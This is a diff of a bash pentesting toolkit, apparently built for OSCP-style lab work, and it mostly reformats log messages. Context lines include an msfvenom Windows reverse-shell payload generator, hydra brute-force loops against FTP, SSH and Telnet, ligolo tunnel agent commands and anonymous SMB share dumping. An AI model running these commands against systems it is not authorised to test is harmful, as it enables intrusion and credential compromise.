@@ -16,6 +16,7 @@ load_private_scripts
 # swiss -h
 function swiss() {
     _banner() {
+        # TODO: fix padding for version string
         swiss_logger info ".--------------------------------------------."
         swiss_logger info "|                                            |"
         swiss_logger info "|                                            |"
@@ -43,10 +44,10 @@ function swiss() {
         grep -E '^\s*function\s+([a-zA-Z_][a-zA-Z0-9_]*)\s*\(\)\s*\{' "$extension_path" | sed -E 's/^\s*function\s+([a-zA-Z_][a-zA-Z0-9_]*)\s*\(\)\s*\{/\1/';
     } | sort | column
 
-    swiss_logger info "\n[i] Aliases:"
+    swiss_logger info "[i] Aliases:"
     grep -E '^\s*alias\s+' "$extension_path" | sed -E 's/^\s*alias\s+([a-zA-Z_][a-zA-Z0-9_]*)=.*/\1/' | sort | column
 
-    swiss_logger info "\n[i] Variables:"
+    swiss_logger info "[i] Variables:"
     {
         grep -E '^\s*[a-zA-Z_][a-zA-Z0-9_]*=' "$extension_path" | sed -E 's/^\s*([a-zA-Z_][a-zA-Z0-9_]*)=.*/\1/';
         grep -E '^\s*[a-zA-Z_][a-zA-Z0-9_]*=' "$alias_path" | sed -E 's/^\s*([a-zA-Z_][a-zA-Z0-9_]*)=.*/\1/';
@@ -59,7 +60,7 @@ function swiss() {
         if [ -f "$script" ]; then
 
             if grep -qE '^\s*function\s+([a-zA-Z_][a-zA-Z0-9_]*)\s*\(\)\s*\{' "$script"; then
-                swiss_logger info "\n[i] Function under $script:"
+                swiss_logger info "[i] Function under $script:"
                 grep -E '^\s*function\s+([a-zA-Z_][a-zA-Z0-9_]*)\s*\(\)\s*\{' "$script"| sed -E 's/^\s*function\s+([a-zA-Z_][a-zA-Z0-9_]*)\s*\(\)\s*\{/\1/' | sort | column
             fi
             
@@ -75,7 +76,7 @@ function swiss() {
         fi
         done
     else
-        echo "Directory $script_dir not found."
+        swiss_logger error "[e] Directory $script_dir not found."
     fi
 }
 
@@ -245,7 +246,7 @@ function nmap_default() {
             swiss_logger info "[i] Check UDP top 200 ports. Saved to $saved_file_path/fast/udp-top-200"
             sudo nmap --top-ports 200 -sU -F -v $ip -oN $saved_file_path/fast/udp-top-200
 
-            swiss_logger warn "[i] Remember to run tcp and udp mode for full enumeration"
+            swiss_logger warn "[w] Remember to run tcp and udp mode for full enumeration"
             ;;
         tcp)
             mkdir -p $saved_file_path/tcp
@@ -259,7 +260,7 @@ function nmap_default() {
             swiss_logger info "[i] Checking vuln script - $ports. Saved to $saved_file_path/tcp/vuln"
             nmap -p$ports --script vuln $ip -oN $saved_file_path/tcp/vuln
 
-            swiss_logger warn "[i] Services found in the second round but not in the first round:"
+            swiss_logger warn "[w] Services found in the second round but not in the first round:"
             comm -13 <(echo "$services_first") <(echo "$services_second")
             ;;
         udp)
@@ -278,7 +279,7 @@ function nmap_default() {
             sudo nmap -sS -p0-65535 -oN $saved_file_path/stealth/stealth
             ;;
         *)
-            echo "Error: Invalid mode '$mode'. Valid modes are: fast, tcp, udp, udp-all."
+            swiss_logger error "[e] Invalid mode '$mode'. Valid modes are: fast, tcp, udp, udp-all."
             return 1
             ;;
     esac
@@ -310,25 +311,25 @@ function svc() {
     case "$service" in
         docker)
             swiss_logger info "[i] start docker"
-            swiss_logger warn "[i] to stop, use the following commands: "
-            swiss_logger warn "[i] sudo systemctl stop docker"
-            swiss_logger warn "[i] sudo systemctl stop docker.socket"
+            swiss_logger warn "[w] to stop, use the following commands: "
+            swiss_logger warn "[w] sudo systemctl stop docker"
+            swiss_logger warn "[w] sudo systemctl stop docker.socket"
             sudo service docker restart
             ;;
         ftp)
             swiss_logger info "[i] start ftp server on host"
-            swiss_logger info "[i] usage:"
-            swiss_logger info "[i] (1) run ftp"
-            swiss_logger info "[i] (2) run open <ip> 21"
-            swiss_logger info "[i] (2-2) Default Interface ($_swiss_default_network_interface) IP: $(get_default_network_interface_ip)"
-            swiss_logger info "[i] (3) use username anonymous"
-            swiss_logger info "[i] (4) binary # use binary mode"
-            swiss_logger info "[i] (5) put <file-you-want-to-download>"
+            swiss_logger info "usage:"
+            swiss_logger info "\t(1) run ftp"
+            swiss_logger info "\t(2) run open <ip> 21"
+            swiss_logger info "\t(2-2) Default Interface ($_swiss_default_network_interface) IP: $(get_default_network_interface_ip)"
+            swiss_logger info "\t(3) use username anonymous"
+            swiss_logger info "\t(4) binary # use binary mode"
+            swiss_logger info "\t(5) put <file-you-want-to-download>"
             python3 -m pyftpdlib -w -p 21
             ;;
         http)
             swiss_logger info "[i] start http server"
-            swiss_logger warn "[i] python3 -m http.server 80"
+            swiss_logger warn "[w] python3 -m http.server 80"
             i
             python3 -m http.server 80
             ;;
@@ -340,7 +341,7 @@ function svc() {
             ;;
         ssh)
             swiss_logger info "[i] start ssh server"
-            swiss_logger warn "[i] sudo systemctl stop ssh; kill -9 $(pgrep ssh); sudo systemctl start ssh"
+            swiss_logger warn "[w] sudo systemctl stop ssh; kill -9 $(pgrep ssh); sudo systemctl start ssh"
             i
             # kill all ssh process
             sudo systemctl stop ssh
@@ -360,7 +361,7 @@ function svc() {
 
             # Check if port 8080 is open using lsof
             if lsof -i :8080 > /dev/null; then
-                swiss_logger error "Port 8080 is open. Exited"
+                swiss_logger error "[e] Port 8080 is open. Exited"
                 exit 1
             fi
 
@@ -375,17 +376,17 @@ function svc() {
         ligolo)
             extension_fn_banner
             swiss_logger info "[i] start ligolo agent"
-            swiss_logger warn "[i] one-time setup: sudo ip tuntap add user $(whoami) mode tun ligolo; sudo ip link set ligolo up"
+            swiss_logger warn "[w] one-time setup: sudo ip tuntap add user $(whoami) mode tun ligolo; sudo ip link set ligolo up"
             swiss_logger info "[i] under target (find agent executable under \$ligolo_path):"
             swiss_logger info "[i] agent.exe -connect $(get_default_network_interface_ip):443 -ignore-cert"
-            swiss_logger warn "[i] Using fingerprint: "
-            swiss_logger warn "[i] agent.exe -connect $(get_default_network_interface_ip):443 -accept-fingerprint [selfcert-value]"
+            swiss_logger warn "[w] Using fingerprint: "
+            swiss_logger warn "[w] agent.exe -connect $(get_default_network_interface_ip):443 -accept-fingerprint [selfcert-value]"
 
             swiss_logger info "[i] after connection: "
             swiss_logger info "[i] > session                                    # choose the session"
             swiss_logger info "[i] > ifconfig                                   # check interface"
             swiss_logger info "[i] sudo ip route add 192.168.0.0/24 dev ligolo  # add interface"
-            swiss_logger warn "[i] ip route del 122.252.228.38/32               # removal after use"
+            swiss_logger warn "[w] ip route del 122.252.228.38/32               # removal after use"
             swiss_logger info "[i] start                                        # start the agent"
 
             local ligolo_agent_path="$HOME/oscp-swiss/utils/tunnel/ligolo-0.6.2/proxy"
@@ -393,12 +394,11 @@ function svc() {
             ;;
         wsgi)
             swiss_logger info "[i] start wsgidav under the directory: $(pwd)"
-            swiss_logger info "[i] usage: svc_wsgi <port>"
             i
             $HOME/.local/bin/wsgidav --host=0.0.0.0 --port=${@} --auth=anonymous --root .
             ;;
         *)
-            swiss_logger error "Error: Invalid service '$service'. Valid service: docker; ftp; http; smb; ssh; bloodhound; wsgi"
+            swiss_logger error "[e] Invalid service '$service'. Valid service: docker; ftp; http; smb; ssh; bloodhound; wsgi"
             return 1
             ;;
     esac
@@ -420,7 +420,7 @@ function ship() {
 
     _helper() {
         swiss_logger error "[e] Filepath is required."
-        swiss_logger info "[i] Usage: ship [-t|--type linux|windows] [-a|--auto-host-http] <filepath>"
+        swiss_logger info "Usage: ship [-t|--type linux|windows] [-a|--auto-host-http] <filepath>"
         return 1
     }
 
@@ -459,7 +459,7 @@ function ship() {
         if [[ "$autoHostHttp" = true ]]; then
             svc http
         else
-            echo warning "[W] Remember to host the web server on your own"
+            swiss_logger warn "[w] Remember to host the web server on your own"
         fi
     }
 
@@ -480,7 +480,7 @@ function ship() {
 
         autoHost
     else
-        log error "Unknown type '$type'. Set to 'linux'."
+        log error "[e] Unknown type '$type'."
     fi
 }
 
@@ -525,16 +525,16 @@ function windows_rev() {
                 shift 2
                 ;;
             *)
-                swiss_logger error "[i] Invalid option: $1"
-                swiss_logger info "[i] usage: gen_win_rev_exe <-p PORT> <-a x86|x64|dll> [-i IP]"
+                swiss_logger error "[e] Invalid option: $1"
+                swiss_logger info "Usage: gen_win_rev_exe <-p PORT> <-a x86|x64|dll> [-i IP]"
                 return 1
                 ;;
         esac
     done
 
     if [[ -z "$port" || -z "$arch" ]]; then
-        swiss_logger error "[i] Port and architecture must be specified"
-        swiss_logger info "[i] usage: gen_win_rev_exe <-p PORT> <-a x86|x64|dll> [-i IP]"
+        swiss_logger error "[e] Port and architecture must be specified"
+        swiss_logger info "Usage: gen_win_rev_exe <-p PORT> <-a x86|x64|dll> [-i IP]"
         return 1
     fi
 
@@ -549,7 +549,7 @@ function windows_rev() {
             msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ip LPORT=$port -f dll -o tzres.dll
             ;;
         *)
-            swiss_logger error "[i] Invalid architecture: $arch. Only x86, x64, and dll are supported."
+            swiss_logger error "[e] Invalid architecture: $arch. Only x86, x64, and dll are supported."
             return 1
             ;;
     esac
@@ -562,9 +562,9 @@ function windows_rev() {
 function ffuf_default() {
 
     _helper() {
-        swiss_logger info "[i] Usage: ffuf_default [URL/FUZZ] (options)"
-        swiss_logger warn "[i] Recursive with depth = $_swiss_ffuf_default_recursive_depth"
-        swiss_logger warn "[i] Default wordlist: $_swiss_ffuf_default_wordlist"
+        swiss_logger info "Usage: ffuf_default [URL/FUZZ] (options)"
+        swiss_logger warn "[w] Recursive with depth = $_swiss_ffuf_default_recursive_depth"
+        swiss_logger warn "[w] Default wordlist: $_swiss_ffuf_default_wordlist"
     }
 
     if [ $# -eq 0 ]; then
@@ -583,9 +583,9 @@ function ffuf_default() {
         mkdir -p "$domain_dir"
 
         if [[ -f "$_swiss_ffuf_default_wordlist.statistic" ]]; then
-            swiss_logger warn "[w] ====== Wordlist Statistic ======"
+            swiss_logger warn "====== Wordlist Statistic ======"
             _cat $_swiss_ffuf_default_wordlist.statistic
-            swiss_logger warn "[w] ================================"
+            swiss_logger warn "================================"
         fi
 
         local stripped_url="${url/FUZZ/}"
@@ -609,8 +609,8 @@ function ffuf_default() {
 # Category: [ func:recon,target:http ]
 function ffuf_traversal_default() {
     _helper() {
-        swiss_logger info "[i] Usage: ffuf_traversal_default [URL] (options)"
-        swiss_logger warn "[i] You may need to try <URL>/FUZZ and <URL>FUZZ"
+        swiss_logger info "Usage: ffuf_traversal_default [URL] (options)"
+        swiss_logger warn "[w] You may need to try <URL>/FUZZ and <URL>FUZZ"
     }
 
     if [ $# -eq 0 ]; then
@@ -627,9 +627,9 @@ function ffuf_traversal_default() {
         mkdir -p "$domain_dir"
 
         if [[ -f "$_swiss_ffuf_traversal_default_wordlist.statistic" ]]; then
-            swiss_logger warn "[w] ====== Wordlist Statistic ======"
+            swiss_logger warn "====== Wordlist Statistic ======"
             _cat $_swiss_ffuf_traversal_default_wordlist.statistic
-            swiss_logger warn "[w] ================================"
+            swiss_logger warn "================================"
         fi
 
         ffuf -w $_swiss_ffuf_traversal_default_wordlist -u ${@} | tee "$domain_dir/traversal-default"
@@ -642,7 +642,7 @@ function ffuf_traversal_default() {
 # Category: [ func:recon,target:http ]
 function gobuster_subdomain_default() {
     _helper() {
-        swiss_logger info "[i] Usage: gobuster_subdomain_default [domain_name] (options)"
+        swiss_logger info "Usage: gobuster_subdomain_default [domain_name] (options)"
     }
 
     if [ $# -eq 0 ]; then
@@ -659,9 +659,9 @@ function gobuster_subdomain_default() {
         mkdir -p "$domain_dir"
 
         if [[ -f "$_swiss_gobuster_subdomain_default_wordlist.statistic" ]]; then
-            swiss_logger warn "[w] ====== Wordlist Statistic ======"
+            swiss_logger warn "====== Wordlist Statistic ======"
             _cat $_swiss_gobuster_subdomain_default_wordlist.statistic
-            swiss_logger warn "[w] ================================"
+            swiss_logger warn "================================"
         fi
 
         gobuster dns -w $_swiss_gobuster_subdomain_default_wordlist -t 20 -o $domain_dir/subdomain-default -d ${@}
@@ -677,7 +677,7 @@ function gobuster_subdomain_default() {
 # Category: [ func:recon,target:http ]
 function gobuster_vhost_default() {
     _helper() {
-        swiss_logger info "[i] Usage: gobuster_vhost_default [ip] [domain] (options)"
+        swiss_logger info "Usage: gobuster_vhost_default [ip] [domain] (options)"
     }
 
     if [ $# -eq 0 ]; then
@@ -691,9 +691,9 @@ function gobuster_vhost_default() {
         mkdir -p "$domain_dir"
 
         if [[ -f "$_swiss_gobuster_vhost_default_wordlist.statistic" ]]; then
-            swiss_logger warn "[w] ====== Wordlist Statistic ======"
+            swiss_logger warn "====== Wordlist Statistic ======"
             _cat $_swiss_gobuster_vhost_default_wordlist.statistic
-            swiss_logger warn "[w] ================================"
+            swiss_logger warn "================================"
         fi
 
         gobuster vhost -k -u $ip --domain $domain --append-domain -r \
@@ -711,26 +711,26 @@ function hydra_default() {
     local PORTS=$2
 
     if [ ! -f "username.txt" ]; then
-        swiss_logger error "[E] username.txt not found in the current directory."
+        swiss_logger error "[e] username.txt not found in the current directory."
         return 1
     fi
 
     for PORT in $(echo $PORTS | tr "," "\n"); do
         case $PORT in
             21)
-                swiss_logger info "[I] Running hydra for FTP on port $PORT..."
+                swiss_logger info "[i] Running hydra for FTP on port $PORT..."
                 hydra -L username.txt -e nsr -s $PORT ftp://$IP
                 ;;
             22)
-                swiss_logger info "[I] Running hydra for SSH on port $PORT..."
+                swiss_logger info "[i] Running hydra for SSH on port $PORT..."
                 hydra -L username.txt -e nsr -s $PORT ssh://$IP
                 ;;
             23)
-                swiss_logger info "[I] Running hydra for Telnet on port $PORT..."
+                swiss_logger info "[i] Running hydra for Telnet on port $PORT..."
                 hydra -L username.txt -e nsr -s $PORT telnet://$IP
                 ;;
             *)
-                echo "Port $PORT not recognized or not supported for brute-forcing by this script."
+                swiss_logger error "[e] Port $PORT not recognized or not supported for brute-forcing by this script."
                 ;;
         esac
     done
@@ -752,7 +752,7 @@ function get_web_pagelink() {
 # Usage: get_web_keywords <url>
 # Category: [ func:recon,target:http ]
 function get_web_keywords() {
-    swiss_logger info "[i] Usage: get_web_keywords <url>"
+    swiss_logger info "Usage: get_web_keywords <url>"
     cewl -d $_swiss_get_web_keywords_depth -m $_swiss_get_web_keywords_min_word_length -w cewl-wordlist.txt $1
 }
 
@@ -770,12 +770,12 @@ function set_target() {
 function get_target() {
     target=$(g target)
     if [[ "$target" == "-1" ]]; then
-        swiss_logger error "Target not found."
+        swiss_logger error "[e] Target not found."
     elif [[ "$target" == "-2" ]]; then
-        swiss_logger error "[!] Config file not found!"
+        swiss_logger error "[e] Config file not found."
     else
         echo -n "$target" | xclip -selection clipboard
-        echo "Target '$target' copied to clipboard."
+        swiss_logger info "[i] Target '$target' copied to clipboard."
     fi
 }
 
@@ -807,7 +807,7 @@ function get_target() {
 #   $ check 14 funny-content # search file content with 'funny-content' under the current directory
 # Category: [ func:pe, func:shortcut, func:memorize ]
 function cp_target_script() {
-    swiss_logger info "[i] Usage: cp_target_script"
+    swiss_logger info "Usage: cp_target_script"
     local shell_path="$HOME/oscp-swiss/script/target-enum-script.sh"
     local new_file_path="$mktemp.sh"
     _cat $shell_path > $new_file_path
@@ -828,7 +828,7 @@ function cp_target_script() {
 # Category: [ func:recon, func:pe, target:windows, target:linux ]
 function listen_target() {
     swiss_logger info "[i] tcpdump to listen on traffic from/to an IP address"
-    swiss_logger info "[i] Usage: listen_target <ip> [-i <interface> | --interface <interface>]"
+    swiss_logger info "Usage: listen_target <ip> [-i <interface> | --interface <interface>]"
 
     local interface="${DEFAULT_NETWORK_INTERFACE:-tun0}"
     local ip=""
@@ -847,7 +847,7 @@ function listen_target() {
     done
 
     if [[ -z "$ip" ]]; then
-        swiss_logger error "[!] IP address is required"
+        swiss_logger error "[e] IP address is required"
         return 1
     fi
 
@@ -872,14 +872,14 @@ function init_workspace() {
 
     local ip_regex="^([0-9]{1,3}\.){3}[0-9]{1,3}$"
     if [[ ! $ip_address =~ $ip_regex ]]; then
-        swiss_logger error "[!] Invalid IP address format."
+        swiss_logger error "[e] Invalid IP address format."
         return 1
     fi
 
     local dir_name="${workspace_name}-${ip_address}"
 
     mkdir -p "$dir_name"
-    cd "$dir_name" || { swiss_logger error "[!] Failed to enter directory '$dir_name'"; return 1; }
+    cd "$dir_name" || { swiss_logger error "[e] Failed to enter directory '$dir_name'"; return 1; }
 
     touch username.txt
     touch password.txt
@@ -958,13 +958,13 @@ function merge() {
     done
 
     if [[ "${#files[@]}" -lt 2 ]]; then
-        swiss_logger error "At least two files to merge."
+        swiss_logger error "[e] At least two files to merge."
         return 1
     fi
 
     for file in "${files[@]}"; do
         if [[ ! -f "$file" ]]; then
-            swiss_logger error "File not found: $file"
+            swiss_logger error "[e] File not found: $file"
             return 1
         fi
     done
@@ -1075,7 +1075,7 @@ function dump() {
             smbclient //$ip/$share -N -c 'prompt OFF;recurse ON;cd; lcd '$PWD';mget *'
             ;;
         *)
-            swiss_logger error "Error: Invalid service '$service'. Valid service: ftp, smb"
+            swiss_logger error "[e] Invalid service '$service'. Valid service: ftp, smb"
             return 1
             ;;
     esac
@@ -1102,7 +1102,7 @@ function make_variable() {
     local name="$2"
 
     if [ ! -f "$file_path" ]; then
-        swiss_logger warn "The file path $file_path does not exist."
+        swiss_logger error "[e] The file path $file_path does not exist."
         return 1
     fi
 
@@ -1152,15 +1152,16 @@ cheatsheet() {
 
     swiss_logger warn info "[i] Available Cheatsheets:"
     for ((i=1; i<=${#files[@]}; i++)); do
-        echo "$((i)). ${files[$i]}"
+        swiss_logger info "$((i)). ${files[$i]}"
     done
 
-    echo -n "Select a cheatsheet by number: "
+    # TODO: fix newline issue
+    swiss_logger info "[i] Select a cheatsheet by number: \c"
     read choice
 
     if [[ $choice -gt 0 && $choice -le ${#files[@]} ]]; then
         local index=$((choice))
-        swiss_logger info "Displaying contents: ${original_files[$index]}:"
+        swiss_logger info "[i] Displaying contents: ${original_files[$index]}:"
         cat "${original_files[$index]}"
     else
         swiss_logger warn "[w] Invalid selection."
@@ -1214,7 +1215,7 @@ function rev_shell() {
     local MODE
     select MODE in "${bash_options[@]}"; do
       if [[ -n "$MODE" ]]; then
-        swiss_logger info "\n[i] Mode $MODE selected."
+        swiss_logger info "[i] Mode $MODE selected."
         local ENCODED_MODE=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$MODE'''))")
         break
       else
@@ -1315,7 +1316,7 @@ function swiss_find() {
             grep -r --include="*" "$2" $find_path 2>/dev/null
             ;;
         *)
-            swiss_logger error "[i] unsupported function"
+            swiss_logger error "[e] unsupported function"
             return 1
             ;;
     esac
@@ -1392,20 +1393,20 @@ function explain() {
     fi
 
     if [[ ! -e "$absolute_path" ]]; then
-        echo "Error: Path '$absolute_path' does not exist."
+        swiss_logger error "[e] Path '$absolute_path' does not exist."
         return 1
     fi
 
     if [[ "$absolute_path" != "$utils_base_path"* ]]; then
-        echo "Error: Only files under $utils_base_path are allowed."
+        swiss_logger "[e] Only files under $utils_base_path are allowed."
     fi
 
     if [[ -d "$absolute_path" ]]; then
         if [[ "$add_mode" -eq 1 ]]; then
-            echo "Adding note for directory $relative_path."
+            swiss_logger debug "[d] Adding note for directory $relative_path."
             add_note "$relative_path"
         else
-            echo "Directory detected. Listing files with descriptions:"
+            swiss_logger debug "[d] Directory detected. Listing files with descriptions:"
             tree -C "$absolute_path" -L 1 | while read -r line; do
                 filename=$(echo "$line" | sed 's/\x1B\[[0-9;]*[a-zA-Z]//g' | awk '{print $NF}')
                 if grep -q "^# $filename$" "$notes_path"; then
@@ -1421,19 +1422,19 @@ function explain() {
         filename=$(basename "$absolute_path")
 
         if grep -q "^# $filename$" "$notes_path"; then
-            echo "Note found for $filename:"
+            swiss_logger debug "[d] Note found for $filename:"
             grep -A 4 "^# $filename$" "$notes_path" | \cat
         else
-            echo "No note found for $filename. Would you like to create one? (y/n)"
+            swiss_logger info "[i] No note found for $filename. Would you like to create one? (y/n)"
             read -r create_note
             if [[ "$create_note" == "y" ]]; then
                 add_note "$relative_path"
             else
-                echo "No note created."
+                swiss_logger debug "[d] No note created."
             fi
         fi
     else
-        echo "Error: '$absolute_path' is neither a valid file nor a directory."
+        swiss_logger error "[e] '$absolute_path' is neither a valid file nor a directory."
     fi
 }
 
@@ -1456,7 +1457,7 @@ function add_note() {
     vim "$temp_note"
     \cat "$temp_note" >> "$notes_path"
     rm "$temp_note"
-    echo "Note saved to $notes_path."
+    swiss_logger info "[u] Note saved to $notes_path."
 }
 
 spawn_session_in_workspace
